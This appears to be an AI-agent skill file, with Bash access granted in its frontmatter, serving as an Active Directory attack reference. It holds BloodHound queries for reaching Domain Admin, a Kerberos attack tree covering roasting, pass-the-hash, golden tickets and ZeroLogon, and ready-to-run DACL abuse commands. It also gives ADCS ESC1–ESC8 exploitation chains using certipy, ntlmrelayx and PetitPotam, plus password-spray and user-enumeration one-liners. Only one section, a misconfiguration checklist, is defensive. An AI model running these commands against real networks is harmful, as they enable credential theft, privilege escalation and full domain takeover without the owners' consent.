---
name: ad-attacks
description: Active Directory attack reference — BloodHound Cypher queries, Kerberos attack decision tree, ACE/ACL abuse, ADCS ESC1-8, and AD misconfig checklist
allowed-tools: Bash, Read
---

## BloodHound Cypher Queries (Neo4j / BloodHound CE)

### Shortest Attack Paths

```cypher
-- Shortest path from any owned computer to Domain Admin
MATCH p=shortestPath((c:Computer {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
RETURN p

-- Shortest path from any owned user to Domain Admin
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
RETURN p

-- All paths from owned nodes to Domain Admin (expand search)
MATCH p=allShortestPaths((n {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
WHERE NOT n=g
RETURN p

-- Shortest path from any node to DA (non-DA owned)
MATCH (n), (g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
WHERE n.owned = true AND NOT n IN nodes(shortestPath((n)-[*1..]->(g)))
MATCH p=shortestPath((n)-[*1..]->(g))
RETURN p LIMIT 10
```

### High-Value Target Discovery

```cypher
-- All Domain Admin users (including nested group membership)
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
RETURN u.name ORDER BY u.name

-- All Domain Controllers
MATCH (c:Computer)-[:MemberOf]->(g:Group {name:"DOMAIN CONTROLLERS@DOMAIN.LOCAL"})
RETURN c.name, c.operatingsystem

-- Find all computers where DA users are logged on
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
MATCH (u)-[:HasSession]->(c:Computer)
RETURN u.name, c.name, c.operatingsystem

-- Users with path to Domain Admin count (ranked)
MATCH (u:User), (g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
WHERE EXISTS(shortestPath((u)-[*1..]->(g)))
RETURN u.name, u.enabled
ORDER BY u.name
```

### Kerberoastable Accounts

```cypher
-- All Kerberoastable users with path to DA
MATCH (u:User {hasspn:true})
WHERE u.enabled = true
OPTIONAL MATCH p=shortestPath((u)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
RETURN u.name, u.serviceprincipalnames, p IS NOT NULL AS has_da_path
ORDER BY has_da_path DESC

-- Kerberoastable users not requiring password change
MATCH (u:User {hasspn:true, enabled:true, pwdneverexpires:true})
RETURN u.name, u.serviceprincipalnames, u.description
```

### AS-REP Roastable Accounts

```cypher
-- All users with "Do not require Kerberos preauthentication" set
MATCH (u:User {dontreqpreauth:true, enabled:true})
RETURN u.name, u.description, u.admincount

-- AS-REP roastable with path to DA
MATCH (u:User {dontreqpreauth:true, enabled:true})
OPTIONAL MATCH p=shortestPath((u)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
RETURN u.name, p IS NOT NULL AS has_da_path
```

### Unconstrained Delegation

```cypher
-- Computers with unconstrained delegation (excluding DCs)
MATCH (c:Computer {unconstraineddelegation:true})
WHERE NOT c.name CONTAINS "DC"
RETURN c.name, c.operatingsystem, c.description

-- Users with unconstrained delegation
MATCH (u:User {unconstraineddelegation:true, enabled:true})
RETURN u.name, u.admincount, u.description
```

### Constrained Delegation

```cypher
-- Users with constrained delegation (check for S4U2Any)
MATCH (u:User)
WHERE u.allowedtodelegate IS NOT NULL AND u.enabled = true
RETURN u.name, u.allowedtodelegate

-- Computers with constrained delegation
MATCH (c:Computer)
WHERE c.allowedtodelegate IS NOT NULL
RETURN c.name, c.allowedtodelegate
```

### ACL / ACE Abuse Paths

```cypher
-- Who has GenericAll on Domain Admins group
MATCH (n)-[:GenericAll]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
RETURN n.name, labels(n)

-- Users with WriteDACL on any object (dangerous ACE)
MATCH (u:User)-[:WriteDACL]->(t)
RETURN u.name, labels(t), t.name
ORDER BY u.name

-- All objects with GenericWrite on high-value targets
MATCH (n)-[:GenericWrite]->(t)
WHERE t.admincount = true
RETURN n.name, labels(n), t.name, labels(t)

-- ForceChangePassword edges (password reset without current pw)
MATCH (n)-[:ForceChangePassword]->(u:User {enabled:true})
RETURN n.name, labels(n), u.name

-- Owned computers that can dcsync (HasDCSync)
MATCH (n)-[:DCSync]->(d:Domain)
RETURN n.name, labels(n), d.name

-- Computers where owned user has local admin
MATCH (u:User {owned:true})-[:AdminTo]->(c:Computer)
RETURN u.name, c.name, c.operatingsystem
```

### Session / Reachability

```cypher
-- Find computers reachable from owned users (local admin)
MATCH (u:User {owned:true})-[:AdminTo]->(c:Computer)
RETURN DISTINCT c.name, c.operatingsystem

-- Find lateral paths from any owned to any DA-session computer
MATCH (u:User {owned:true})-[:AdminTo]->(c:Computer)<-[:HasSession]-(da:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
RETURN u.name, c.name, da.name
```

---

## Kerberos Attack Decision Tree

```
Target: Active Directory Environment
│
├─ No credentials? → Try AS-REP Roasting (impacket-GetNPUsers, no auth required)
│                     └─ Got hash? → hashcat -m 18200
│
├─ Got valid username + password?
│   ├─ Can enumerate SPNs? → Kerberoasting (impacket-GetUserSPNs)
│   │                         └─ Got hash? → hashcat -m 13100
│   ├─ Has unconstrained delegation?
│   │   └─ Get TGTs from connections → Rubeus / mimikatz monitor
│   └─ Has constrained delegation?
│       └─ S4U2Self + S4U2Proxy → impacket-getST -spn
│
├─ Got NTLM hash (not cracked)?
│   ├─ Pass-the-Hash → impacket-psexec/wmiexec/smbexec -hashes
│   └─ Silver Ticket (if target SPN known + machine hash available)
│       → impacket-ticketer -nthash [machine hash] -spn [SPN]
│
├─ Got DA credential / krbtgt hash?
│   └─ Golden Ticket → impacket-ticketer -nthash [krbtgt hash] -domain-sid [SID]
│                        → Persist for 10 years, roam any service
│
├─ Got ADCS (Certificate Services) present?
│   ├─ ESC1 (template allows SAN) → certipy req + authenticate
│   ├─ ESC4 (write on template) → certipy template + ESC1 exploit
│   ├─ ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2) → certipy req any UPN
│   └─ ESC8 (web enrollment NTLM relay) → ntlmrelayx → certipy auth
│
└─ ZeroLogon (CVE-2020-1472)?
    └─ impacket zerologon → reset machine account pw → DCSync
```

---

## ACE / ACL Abuse Cheatsheet

| ACE Type | Target Object | Exploit | Tool |
|---|---|---|---|
| **GenericAll** | User | Change password / add to group | `net rpc password`, `impacket-dacledit` |
| **GenericAll** | Group | Add any member | `net rpc group addmem` |
| **GenericAll** | Computer | Configure RBCD, change msDS-AllowedToActOnBehalfOfOtherIdentity | `impacket-rbcd` |
| **GenericAll** | GPO | Add computer startup script → RCE | `impacket-owneredit` + GPO edit |
| **GenericWrite** | User | Write ServicePrincipalName → Kerberoast target | `impacket-addspn` |
| **GenericWrite** | Computer | RBCD attack | `impacket-rbcd` |
| **GenericWrite** | Group | Add member | `net rpc group addmem` |
| **WriteDACL** | Any | Grant yourself GenericAll | `impacket-dacledit` |
| **WriteOwner** | Any | Take ownership → WriteDACL → GenericAll | `impacket-owneredit` |
| **ForceChangePassword** | User | Reset password without knowing current | `net rpc password $USER` |
| **AllExtendedRights** | User | Change password + read LAPS | `net rpc password $USER` |
| **AllExtendedRights** | Domain | DCSync | `impacket-secretsdump` |
| **DS-Replication-Get-Changes** | Domain | DCSync (both rights needed) | `impacket-secretsdump` |
| **AddMember** | Group | Add self to group | `net rpc group addmem` |
| **ReadLAPSPassword** | Computer | Read local admin password | `pyLAPS` / `crackmapexec smb --laps` |
| **ReadGMSAPassword** | Service Account | Read gMSA password blob | `gMSADumper.py` |

### DACL Abuse Commands

```bash
# Check current ACLs on an object
impacket-dacledit -action read -target "$TARGET_USER" \
  "$DOMAIN/$ATTACKER_USER:$PASS" -dc-ip $DC_IP

# Grant GenericAll to attacker user
impacket-dacledit -action write -rights FullControl \
  -target "$TARGET_OBJECT" -principal "$ATTACKER_USER" \
  "$DOMAIN/$ATTACKER_USER:$PASS" -dc-ip $DC_IP

# Take ownership of object (WriteOwner)
impacket-owneredit -action write -new-owner "$ATTACKER_USER" \
  -target "$TARGET_OBJECT" "$DOMAIN/$ATTACKER_USER:$PASS" -dc-ip $DC_IP

# Add member to group
net rpc group addmem "$GROUP_NAME" "$ATTACKER_USER" \
  -U "$DOMAIN/$ATTACKER_USER%$PASS" -S $DC_IP

# Force password change
net rpc password "$TARGET_USER" "NewPass123!" \
  -U "$DOMAIN/$ATTACKER_USER%$PASS" -S $DC_IP
```

---

## ADCS ESC Attack Scenarios (ESC1–ESC8)

### ESC1 — Enrollee Supplies Subject (SAN)

```bash
# Identify vulnerable templates
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC_IP -vulnerable -stdout

# Request certificate with admin UPN in SAN
certipy req -u $USER@$DOMAIN -p $PASS -ca $CA_NAME \
  -template $TEMPLATE_NAME \
  -upn administrator@$DOMAIN \
  -dc-ip $DC_IP

# Authenticate with certificate to get NTLM hash
certipy auth -pfx administrator.pfx -dc-ip $DC_IP
```

### ESC2 — Any Purpose / SubCA

```bash
# Template allows Any Purpose EKU — can forge for any use
certipy req -u $USER@$DOMAIN -p $PASS -ca $CA_NAME \
  -template $ESC2_TEMPLATE \
  -upn administrator@$DOMAIN \
  -dc-ip $DC_IP
```

### ESC3 — Enrollment Agent Abuse

```bash
# Step 1: Enroll as enrollment agent
certipy req -u $USER@$DOMAIN -p $PASS -ca $CA_NAME \
  -template EnrollmentAgent -dc-ip $DC_IP

# Step 2: Request cert on behalf of admin using enrollment agent cert
certipy req -u $USER@$DOMAIN -p $PASS -ca $CA_NAME \
  -template $TARGET_TEMPLATE \
  -on-behalf-of $DOMAIN\\Administrator \
  -pfx $USER.pfx -dc-ip $DC_IP
```

### ESC4 — Template Write Permissions

```bash
# Check if we have write permissions on template
certipy template -u $USER@$DOMAIN -p $PASS \
  -template $VULN_TEMPLATE -dc-ip $DC_IP

# Modify template to add ESC1 conditions (enable SAN + disable approval)
certipy template -u $USER@$DOMAIN -p $PASS \
  -template $VULN_TEMPLATE -save-old -dc-ip $DC_IP

# Now exploit as ESC1
certipy req -u $USER@$DOMAIN -p $PASS -ca $CA_NAME \
  -template $VULN_TEMPLATE -upn administrator@$DOMAIN -dc-ip $DC_IP

# Restore original template
certipy template -u $USER@$DOMAIN -p $PASS \
  -template $VULN_TEMPLATE -configuration $VULN_TEMPLATE.json -dc-ip $DC_IP
```

### ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2

```bash
# CA has EDITF_ATTRIBUTESUBJECTALTNAME2 set — any template allows SAN
certipy req -u $USER@$DOMAIN -p $PASS -ca $CA_NAME \
  -template User -upn administrator@$DOMAIN -dc-ip $DC_IP
```

### ESC7 — CA Officer/Manager Misconfig

```bash
# Approve pending certificates using CA Manager rights
certipy ca -u $USER@$DOMAIN -p $PASS -ca $CA_NAME \
  -issue-request $REQUEST_ID -dc-ip $DC_IP
```

### ESC8 — NTLM Relay to ADCS HTTP Enrollment

```bash
# Terminal 1: Start ntlmrelayx targeting CA web enrollment
impacket-ntlmrelayx -t http://$CA_HOST/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# Terminal 2: Trigger NTLM auth (coerce DC to authenticate)
python3 PetitPotam.py $ATTACKER_IP $DC_IP

# Terminal 3: Authenticate with returned base64 certificate
certipy auth -pfx dc.pfx -dc-ip $DC_IP
```

---

## Common Active Directory Misconfiguration Checklist

| # | Check | Risk | Detection |
|---|---|---|---|
| 1 | **SMB Signing disabled** | NTLM relay attacks | `crackmapexec smb $SUBNET --gen-relay-list targets.txt` |
| 2 | **LLMNR/NBT-NS enabled** | Credential capture via Responder | Responder on local segment |
| 3 | **AS-REP Roastable accounts** | Offline hash cracking (no creds needed) | `impacket-GetNPUsers $DOMAIN/ -dc-ip $DC_IP` |
| 4 | **Kerberoastable service accounts** | Offline hash cracking | `impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC_IP` |
| 5 | **Password in description field** | Trivial credential disclosure | BloodHound node details |
| 6 | **Unconstrained delegation computers** | TGT capture from visiting connections | `Get-ADComputer -Filter {TrustedForDelegation -eq $true}` |
| 7 | **AdminSDHolder misconfiguration** | Persistent admin rights via SDProp | Check AdminCount=1 on unexpected objects |
| 8 | **Excessive Domain Admin membership** | Blast radius of compromised DA | BloodHound DA group count |
| 9 | **LAPS not deployed** | Common local admin password | `crackmapexec smb $TARGET --laps` |
| 10 | **Password policy weak** | Brute force / password spray | `net accounts /domain` |
| 11 | **stale accounts (90+ days)** | Abandoned accounts with valid creds | `Get-ADUser -Filter {LastLogonDate -lt (Get-Date).AddDays(-90)}` |
| 12 | **Dangerous ACLs on users/groups** | Privilege escalation without exploits | BloodHound ACL analysis |
| 13 | **DC not patched (ZeroLogon, Printnightmare)** | Critical pre-auth RCE/LPE | Nmap version + CVE check |
| 14 | **ADCS misconfigured (ESC1-8)** | Certificate-based full domain compromise | `certipy find -vulnerable` |
| 15 | **Trusts with SID filtering disabled** | Cross-forest escalation | `Get-ADTrust -Filter *` |
| 16 | **Domain Functional Level < 2012R2** | Missing security features | `Get-ADDomain | select DomainMode` |
| 17 | **WDigest enabled (Windows 7/2008)** | Cleartext credential caching | `reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest` |
| 18 | **PrintSpooler running on DCs** | PrintNightmare, SpoolSample coercion | `Get-Service Spooler -ComputerName $DC` |
| 19 | **NTLM not restricted** | Pass-the-Hash across domain | `net accounts /domain` + NTLM audit event 4776 |
| 20 | **BloodHound data stale** | Missed new attack paths | Re-run collection: `bloodhound-python -c All` |

---

## Domain Recon One-Liners

```bash
# Full enum with enum4linux-ng
enum4linux-ng -A $DC_IP 2>&1 | tee evidence/enum4linux.txt

# LDAP dump (authenticated)
ldapdomaindump -u "$DOMAIN\\$USER" -p "$PASS" $DC_IP \
  -o evidence/ldapdump/

# BloodHound Python collection (all methods)
bloodhound-python -u $USER -p $PASS -d $DOMAIN \
  -dc $DC_FQDN -c All --zip \
  -o evidence/bloodhound/

# Password spray (threshold: 1 per 30 min to avoid lockout)
crackmapexec smb $DC_IP \
  -u evidence/userlist.txt \
  -p 'Winter2025!' \
  --continue-on-success 2>&1 | tee evidence/spray.txt

# kerbrute user enumeration (no auth, no lockout)
kerbrute userenum \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  --dc $DC_IP -d $DOMAIN \
  -o evidence/valid_users.txt

# Extract domain users to file via LDAP
ldapsearch -x -H ldap://$DC_IP \
  -D "$USER@$DOMAIN" -w "$PASS" \
  -b "DC=$(echo $DOMAIN | sed 's/\./,DC=/g')" \
  "(objectClass=user)" sAMAccountName | \
  grep sAMAccountName | awk '{print $2}' > evidence/users.txt
```
